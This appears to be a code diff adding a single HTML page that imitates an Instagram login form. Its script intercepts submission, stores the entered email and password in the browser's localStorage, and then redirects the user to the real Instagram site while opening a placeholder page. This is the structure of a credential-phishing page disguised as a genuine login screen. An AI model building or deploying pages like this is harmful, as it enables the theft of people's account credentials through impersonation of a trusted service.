@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fafafa;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background-color: #fff;
+      border-radius: 8px;
+      padding: 40px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      width: 320px;
+      text-align: center;
+    }
+    h2 {
+      margin-bottom: 20px;
+    }
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 20px;
+      border-radius: 4px;
+      border: 1px solid #dbdbdb;
+      box-sizing: border-box;
+    }
+    input[type="submit"] {
+      background-color: #3897f0;
+      color: #fff;
+      border: none;
+      padding: 10px 0;
+      border-radius: 4px;
+      cursor: pointer;
+      width: 100%;
+    }
+    input[type="submit"]:hover {
+      background-color: #3578e5;
+    }
+    .img{
+        width: 30px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Instagram Login</h2>
+    <img src="th.jpg" alt="" class="img">
+    <form id="loginForm">
+      <input type="text" id="email" name="email" placeholder="Email">
+      <input type="password" id="password" name="password" placeholder="Password">
+      <input type="submit" value="Log In">
+    </form>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const loginForm = document.getElementById('loginForm');
+
+      loginForm.addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        // Get email and password input values
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        // Store email and password in local storage
+        localStorage.setItem('userEmail', email);
+        localStorage.setItem('userPassword', password);
+
+        // Open Instagram's website (Sample URL)
+        window.location.href = 'https://www.instagram.com/';
+
+        // Open this site on the phone (Sample URL)
+        window.open('https://www.example.com/', '_blank');
+      });
+    });
+  </script>
+</body>
+</html>
